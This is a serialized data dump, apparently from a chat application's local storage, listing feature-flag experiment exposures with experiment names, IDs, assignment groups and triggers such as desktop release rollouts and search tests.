log_exposuresF"exposure_idN LguB{"'shared_channels_invite_create_educationo"
experiment_id"
1118992068263"type"user"group"control"trigger"finished"
log_exposuresF"exposure_idN LguB{"search_select_no_loadingo"
experiment_id"
1121998429218"type"user"group"
no_loading"trigger"finished"
log_exposuresF"exposure_idN LguB{"channel_sections_dim_emojio"
experiment_id"
1122089731906"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{"$desktop_release_prod_win32_4___5___1o"
experiment_id"
1123535815780"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"%desktop_release_prod_darwin_4___6___0o"
experiment_id"
1124370969703"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"$desktop_release_beta_win32_4___6___0o"
experiment_id"
1127672512054"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"calendar_show_calling_optionso"
experiment_id"
1133480242325"type"user"group"enabled"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"%desktop_release_beta_darwin_4___6___0o"
experiment_id"
1134405063714"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"+desktop_release_beta_win32_4___6___0__beta1o"
experiment_id"
1135084800528"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"snd_omni_15o"
experiment_id"
1136560581815"type"user"group"omni_17"trigger"finished"
log_exposuresF"exposure_idN LguB{"always_show_send_buttono"
experiment_id"
1140101075472"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{"parsec_message_search_rankingo"
experiment_id"
1143915487457"type"user"group"update"trigger"finished"
log_exposuresF"exposure_idN LguB{",desktop_release_alpha_win32_4___7___0__beta1o"
experiment_id"
1147706840551"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"*desktop_release_eta_win32_4___7___0__beta1o"
experiment_id"
1147706870359"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"$desktop_release_prod_win32_4___6___0o"
experiment_id"
1151735920017"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"
xws_socketo"
experiment_id"
1152968057991"type"user"group"xws_socket_treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"+desktop_release_eta_darwin_4___7___0__beta1o"
experiment_id"
1168628861764"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"xws_activityo"
experiment_id"
1170458364405"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"global_rtm_queue_draino"
experiment_id"
1170480375174"type"user"group"enabled"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"+desktop_release_beta_win32_4___7___0__beta1o"
experiment_id"
1175072471921"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{" wysiwyg_search_highlighting_usero"
experiment_id"
1177788411248"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"*desktop_release_eta_win32_4___7___0__beta3o"
experiment_id"
1183546903399"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"turn_off_shingling_search_6_8o"
experiment_id"
1184216177553"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{" snd_query_refinement_suggestionso"
experiment_id"
1184679504386"type"user"group"control"trigger"finished"
log_exposuresF"exposure_idN LguB{",desktop_release_beta_darwin_4___7___0__beta1o"
experiment_id"
1186285833008"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"-desktop_release_alpha_darwin_4___7___0__beta1o"
experiment_id"
1186285861920"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"%custom_status_modal_calendar_sync_stdo"
experiment_id"
1186488457969"type"user"group"control"trigger"finished"
log_exposuresF"exposure_idN LguB{"new_share_icono"
experiment_id"
1190934369650"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"new_boot_logino"
experiment_id"
1191102532455"type"user"group"	treatment"trigger"	hash_user"
log_exposuresT"exposure_idN LguB{"$free_team_one_on_one_calls_discoveryo"
experiment_id"
1193077556035"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{",desktop_release_alpha_win32_4___7___0__beta3o"
experiment_id"
1196910862917"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{".desktop_release_alpha_darwin_4___8___0__alpha1o"
experiment_id"
1198239096679"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"+desktop_release_beta_win32_4___7___0__beta3o"
experiment_id"
1198289441266"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"$desktop_release_beta_win32_4___7___0o"
experiment_id"
1198613197303"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"+desktop_release_eta_darwin_4___7___0__beta3o"
experiment_id"
1202461671141"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"-desktop_release_alpha_darwin_4___7___0__beta3o"
experiment_id"
1203840189698"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"modal_viewero"
experiment_id"
1204190931522"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"5better_app_suggestions_enable_for_aaa_teams_plus_grido"
experiment_id"
1204265931830"type"user"group"variant"trigger"finished"
log_exposuresF"exposure_idN LguB{"$paid_team_one_on_one_calls_discoveryo"
experiment_id"
1205492841329"type"user"group"control"trigger"finished"
log_exposuresF"exposure_idN LguB{"*workflow_builder_destination_templates_tabo"
experiment_id"
1206502057395"type"user"group"treatment_1"trigger"finished"
log_exposuresF"exposure_idN LguB{"custom_dnd_times_wrapo"
experiment_id"
1208480981270"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"calls_get_media_access_checko"
experiment_id"
1209599998755"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{" archive_channel_migrated_threadso"
experiment_id"
1209927070932"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{",desktop_release_beta_darwin_4___7___0__beta3o"
experiment_id"
1210020219796"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"recent_custom_status_apio"
experiment_id"
1210642279015"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"%desktop_release_prod_darwin_4___7___0o"
experiment_id"
1212915438130"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"threads_get_inner_filtero"
experiment_id"
1214811848385"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"tokenize_in_composero"
experiment_id"
1215171874260"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{"-desktop_release_alpha_win32_4___8___0__alpha1o"
experiment_id"
1219162017396"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"%desktop_release_beta_darwin_4___7___0o"
experiment_id"
1219536148388"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"refine_your_searcho"
experiment_id"
1219784197954"type"user"group"guided"trigger"launch_user"
log_exposuresF"exposure_idN LguB{",desktop_release_beta_darwin_4___8___0__beta1o"
experiment_id"
1220090589607"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"snd_autocomplete_features_cacheo"
experiment_id"
1220161109956"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"new_boot_rtm_connecto"
experiment_id"
1220306372084"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{"use_is_unread_for_threadso"
experiment_id"
1220509552725"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"snd_autocomplete_model_2o"
experiment_id"
1226155062374"type"user"group"treatment_offline_features_all"trigger"finished"
log_exposuresF"exposure_idN LguB{"reduced_query_suggestionso"
experiment_id"
1232126351174"type"user"group"max_suggestions_50"trigger"finished"
log_exposuresF"exposure_idN LguB{"$desktop_release_prod_win32_4___7___0o"
experiment_id"
1236751524912"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"new_boot_rtm_connect_deuxo"
experiment_id"
1239616415781"type"user"group"	treatment"trigger"	hash_user"
log_exposuresT"exposure_idN LguB{"searcher_files_autocompleteo"
experiment_id"
1239639427461"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{"+desktop_release_beta_win32_4___8___0__beta1o"
experiment_id"
1241017740676"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"searcher_sessions_phase_1o"
experiment_id"
1241834322609"type"user"group"	treatment"trigger"	hash_user"
log_exposuresT"exposure_idN LguB{"%desktop_release_beta_darwin_4___8___0o"
experiment_id"
1244759208423"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"calls_ux_refresh_button_labelso"
experiment_id"
1248388605542"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"members_store_cache_evictiono"
experiment_id"
1250815019269"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{"new_boot_flannel_starto"
experiment_id"
1251500799283"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"snd_more_app_actionso"
experiment_id"
1253852277285"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{" slackbot_similar_channels_parseco"
experiment_id"
1255015836966"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{"%desktop_release_prod_darwin_4___8___0o"
experiment_id"
1258129091141"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"$desktop_release_beta_win32_4___8___0o"
experiment_id"
1259707556947"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"search_message_actionso"
experiment_id"
1262315816610"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{"iap2_rollouto"
experiment_id"
1267902880369"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"messages_cache_evictiono"
experiment_id"
1279825620804"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{"snd_browse_feature_fileso"
experiment_id"
1279874567780"type"user"group"control"trigger"finished"
log_exposuresF"exposure_idN LguB{"snd_browse_feature_channelso"
experiment_id"
1279876856564"type"user"group"
xgb_update"trigger"finished"
log_exposuresF"exposure_idN LguB{"snd_browse_feature_userso"
experiment_id"
1286314961905"type"user"group"control"trigger"finished"
log_exposuresF"exposure_idN LguB{"composer_escape_hatcho"
experiment_id"
1290021982324"type"user"group"control"trigger"	hash_user"
log_exposuresT"exposure_idN LguB{""turn_shingling_off_search_messageso"
experiment_id"
1291414414356"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"day1_native_appso"
experiment_id"
1292502137028"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{" xws_threads_with_shared_channelso"
experiment_id"
1297517868384"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"edu_182o"
experiment_id"
1309868808502"type"user"group"control"trigger"	hash_user"
log_exposuresT"exposure_idN LguB{"nesh_dummy_usero"
experiment_id"
1312288522916"type"user"group"
experiment"trigger"	hash_user"
log_exposuresT"exposure_idN LguB{"invite_to_channel_by_emailo"
experiment_id"
1320370797778"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{"channels_cache_evictiono"
experiment_id"
1327069931861"type"user"group"control"trigger"	hash_user"
log_exposuresT"exposure_idN LguB{"$desktop_release_prod_win32_4___9___0o"
experiment_id"
1333252064118"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"omniswitcher_member_suggestionso"
experiment_id"
1333816573381"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{"%desktop_release_prod_darwin_4___9___0o"
experiment_id"
1336896789509"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{".desktop_release_alpha_win32_4___10___0__alpha1o"
experiment_id"
1346937098246"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"mobile_calls_regionso"
experiment_id"
1353292954308"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"/desktop_release_alpha_darwin_4___10___0__alpha1o"
experiment_id"
1353667792034"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"custom_status_expire_orphanedo"
experiment_id"
1355596188263"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"$calls_get_media_access_check_windowso"
experiment_id"
1357316213204"type"user"group"enabled"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"meetings_enabled_zoomo"
experiment_id"
1361712537924"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"snd_autocomplete_model_4o"
experiment_id"
1363204939201"type"user"group"treatment_update_files"trigger"finished"
log_exposuresF"exposure_idN LguB{"!cs_scale_connect_awareness_adminso"
experiment_id"
1366627793015"type"user"group"control"trigger"	hash_user"
log_exposuresT"exposure_idN LguB{"
cjk_top_termso"
experiment_id"
1368326017651"type"user"group"control"trigger"	hash_user"
log_exposuresT"exposure_idN LguB{"$cs_scale_connect_awareness_championso"
experiment_id"
1383595495461"type"user"group"control"trigger"	hash_user"
log_exposuresT"exposure_idN LguB{"shortcuts_searchero"
experiment_id"
1398520849015"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"#snd_query_refinement_suggestions_v2o"
experiment_id"
1403442391859"type"user"group"control"trigger"	hash_user"
log_exposuresT"exposure_idN LguB{"modernize_customize_slackboto"
experiment_id"
1404607038160"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{"
newxp_4590o"
experiment_id"
1407081448790"type"user"group"	treatment"trigger"	hash_user"
log_exposuresT"exposure_idN LguB{"&desktop_release_prod_darwin_4___10___2o"
experiment_id"
1419912128419"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{" android_heartbeat_configurationso"
experiment_id"
1424955523574"type"user"group"default_500_1_1000"trigger"launch_user"
log_exposuresF"exposure_idN LguB{".desktop_release_alpha_win32_4___11___0__alpha1o"
experiment_id"
1428915582485"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"/desktop_release_alpha_darwin_4___11___0__alpha1o"
experiment_id"
1432004269378"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"social_nudge_v0o"
experiment_id"57452636336"type"team"group" "trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"migrate_stats_to_cdso"
experiment_id"70039090853"type"team"group"	stats_cds"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"migrate_stats_enable_dark_readso"
experiment_id"70047028338"type"team"group"stats_mysql_and_cds_dark_reads"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"domain_signup_links_for_mobileo"
experiment_id"70804845972"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"update_invite_coachmarks_ctao"
experiment_id"84280109270"type"team"group"invite_cm_got_ita"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"google_contacts_invite_existingo"
experiment_id"93086200404"type"team"group"google_contacts"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"google_contacts_invite_newo"
experiment_id"93096027173"type"team"group" "trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"edit_team_status_presetso"
experiment_id"176895283504"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"feat_onepage_signup_v2o"
experiment_id"205971003682"type"team"group"single_page"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"no_content_availso"
experiment_id"272365364819"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"apns2_part_2o"
experiment_id"283505922689"type"team"group" "trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"
apns_collapseo"
experiment_id"286616632582"type"team"group" "trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"search_test_exp_2o"
experiment_id"394969365857"type"team"group" "trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"search_improvementso"
experiment_id"396534667719"type"team"group"search_improvements"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"sfmc_paidslack_webinaro"
experiment_id"398407564070"type"team"group"	treatment"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"stripe_l3_datao"
experiment_id"402252049446"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"search_improvements_enterpriseo"
experiment_id"402584856352"type"team"group"search_improvements_enterprise"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"stripe_l3_data_v2o"
experiment_id"404550106855"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"calls_orca_beta_2018_08_28o"
experiment_id"424285508673"type"team"group" "trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"new_dunning_notifso"
experiment_id"443295043686"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"channel_search_indexingo"
experiment_id"527816425013"type"team"group"channel_search_indexing"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"lc_file_limit_hide_fileso"
experiment_id"532213597121"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"untrusted_devices_copyo"
experiment_id"546106345059"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"
newxp_2063o"
experiment_id"572727283366"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"
local_pricingo"
experiment_id"578825115026"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"lc_checkout_legacy_xhp_flipo"
experiment_id"579084333493"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"channel_search_top_termso"
experiment_id"579371808119"type"team"group"channel_search_top_terms"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"better_email_decodingo"
experiment_id"582142370787"type"team"group"control"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"notify_upon_channel_inviteo"
experiment_id"594633593813"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"steeple_churcho"
experiment_id"595499694579"type"team"group"steeple_church"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"i18n_toast_en_gbo"
experiment_id"607556141969"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"i18n_toast_pt_bro"
experiment_id"613809025904"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"i18n_toast_es_lao"
experiment_id"613819414576"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"plus_menu_improvementso"
experiment_id"632628067845"type"team"group"legacy_plus_menu"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"+lc_mon_checkout_prominent_schedule_selectoro"
experiment_id"636276422023"type"team"group"control"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"stars_vitess_light_by_teamo"
experiment_id"646945740566"type"team"group"light"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{" calls_sunset_interactive_messageo"
experiment_id"648981938129"type"team"group"enabled"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{" stars_vitess_light_by_enterpriseo"
experiment_id"649016204673"type"team"group"light"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"pricing_page_benefits_emailo"
experiment_id"649406603829"type"team"group"no_email"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"*platform_gdrive_in_sidebar_stdplus_installo"
experiment_id"652712652679"type"team"group"variant"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"checkout_full_schedule_selectoro"
experiment_id"659759601445"type"team"group"control"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"message_limit_emailo"
experiment_id"660542603024"type"team"group"email"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"human_assist_emailo"
experiment_id"660853856416"type"team"group" "trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"sfmc_dev_app_home_openedo"
experiment_id"666095530050"type"team"group"email_later"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"free_trial_onboarding_revampo"
experiment_id"668509836754"type"team"group"receive_email_series"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"wysiwyg_messages_webappo"
experiment_id"668558052081"type"team"group"wysiwyg_messages_webapp"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"local_discount_awarenesso"
experiment_id"676574190244"type"team"group"
treatment1"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"wysiwyg_composer_webappo"
experiment_id"677003809188"type"team"group"wysiwyg_composer_webapp"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"&show_more_apps_in_sidebar_new_and_freeo"
experiment_id"678193947031"type"team"group"control"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"0desktop_release_test_eta_win32_4___1___0__alpha1o"
experiment_id"683827429844"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"request_to_inviteo"
experiment_id"683970366418"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"calls_modern_from_legacy_teamo"
experiment_id"685212209062"type"team"group"enabled"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{""calls_modern_from_legacy_paid_teamo"
experiment_id"690075811783"type"team"group"enabled"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"message_limit_social_proof_testo"
experiment_id"694754674131"type"team"group"both_emails_in_series"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"$checkout_modern_add_negative_balanceo"
experiment_id"696163413809"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"!tenured_teams_user_searches_emailo"
experiment_id"699306976192"type"team"group"human_assist_email"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"checkoutv2_paid_onboardingo"
experiment_id"702519900165"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"'vitess_files_team_tier_prod_sunset_freeo"
experiment_id"709730125110"type"team"group"migrate"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"my_test_experimento"
experiment_id"710722351712"type"team"group" "trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"get_ext_users_light_mode_patho"
experiment_id"711058489861"type"team"group"teams"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{",vitess_files_team_tier_prod_light_enterpriseo"
experiment_id"713111949350"type"team"group"migrate"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"%vitess_files_team_tier_prod_light_stdo"
experiment_id"713130671318"type"team"group"migrate"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"+desktop_release_eta_win32_4___1___0__alpha5o"
experiment_id"717775990850"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{",desktop_release_eta_darwin_4___1___0__alpha5o"
experiment_id"717776094147"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{",desktop_release_eta_darwin_4___1___0__alpha1o"
experiment_id"720403999380"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"pricing_page_benefits_email_v2o"
experiment_id"721799168641"type"team"group"no_email"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"&vitess_files_team_tier_prod_light_pluso"
experiment_id"731587830034"type"team"group"migrate"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"jq_kill_switch_aops_1217o"
experiment_id"733208906503"type"team"group"jq_kill_switch_aops_1217"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"channel_notification_settingso"
experiment_id"735687176757"type"team"group"
new_design"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{" imports_channel_table_separationo"
experiment_id"736112524838"type"team"group" "trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"
ekm_async_apio"
experiment_id"736772027616"type"team"group"ekm_async_on"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"exp_return_cached_ext_dmso"
experiment_id"742209013446"type"team"group"teams"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"deprecate_charge_high_balanceo"
experiment_id"743042212418"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"migrate_push_badge_counto"
experiment_id"747723917109"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"-vitess_files_team_tier_prod_sunset_complianceo"
experiment_id"759147106147"type"team"group"migrate"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"exp_get_team_chan_mems_simplifyo"
experiment_id"760832236274"type"team"group"teams"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"'vitess_files_team_tier_prod_sunset_pluso"
experiment_id"764201649201"type"team"group"migrate"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"shared_channels_free_trialo"
experiment_id"769914623831"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"&vitess_files_team_tier_prod_sunset_stdo"
experiment_id"770153226372"type"team"group"migrate"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"newxp_2372_2o"
experiment_id"778176184996"type"team"group"treatment_b"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"'gsuite_email_audience2_scale_admins_pt2o"
experiment_id"781491944899"type"team"group"email_scale_admins"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"mpim_members_cache_teamo"
experiment_id"783519220595"type"team"group"cache"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"$limit_meter_spanish_no_abbreviationso"
experiment_id"784748427445"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"better_inviteso"
experiment_id"792270323923"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"$desktop_release_beta_win32_4___1___1o"
experiment_id"792480938402"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"%desktop_release_alpha_win32_4___1___1o"
experiment_id"792480945394"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"!o365_email_audience2_scale_adminso"
experiment_id"792979794485"type"team"group"email_scale_admins"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"%desktop_release_prod_darwin_4___1___0o"
experiment_id"793794558387"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"service_bot_fill_id_latero"
experiment_id"795887468964"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"%desktop_release_beta_darwin_4___1___0o"
experiment_id"804800299460"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"$desktop_release_prod_win32_4___1___1o"
experiment_id"805271655653"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{",desktop_release_eta_darwin_4___3___0__alpha2o"
experiment_id"806173080628"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"+desktop_release_eta_win32_4___3___0__alpha2o"
experiment_id"808847065798"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"jj_test_new_expo"
experiment_id"809703704309"type"team"group"control"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"delete_old_user_push_tokenso"
experiment_id"812581188981"type"team"group"control"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"
calls_4902o"
experiment_id"825303372262"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"login_do_login_maybe_join_usero"
experiment_id"826909502566"type"team"group" "trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"#invite_requests_domain_whitelistingo"
experiment_id"838484565431"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"plans_page_clarify_searcho"
experiment_id"845530856642"type"team"group"treatment_2"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"
asyncify_teamo"
experiment_id"845734868531"type"team"group"asyncify_on"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"'feat_vitess_messages_chan_latest_site_2o"
experiment_id"848708449363"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"+vt_untangle_ud_channels_get_by_team_user_ido"
experiment_id"851753439808"type"team"group"no_join"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"test_test_testo"
experiment_id"857866547891"type"team"group"control"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"+vitess_messages_grpc_fix_olap_queries_asynco"
